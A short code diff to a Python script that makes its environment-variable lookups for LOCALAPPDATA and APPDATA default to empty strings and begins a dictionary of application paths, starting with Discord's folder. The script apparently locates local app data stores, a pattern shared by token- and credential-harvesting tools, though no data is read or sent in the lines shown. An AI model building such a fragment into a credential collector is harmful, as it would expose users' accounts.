@@ -3,8 +3,8 @@ import shutil
 import sqlite3
 from pprint import pprint
 
-local = os.getenv("LOCALAPPDATA")
-roaming = os.getenv("APPDATA")
+local = os.getenv("LOCALAPPDATA", "")
+roaming = os.getenv("APPDATA", "")
 
 paths = {
     "Discord": roaming + r"\Discord",
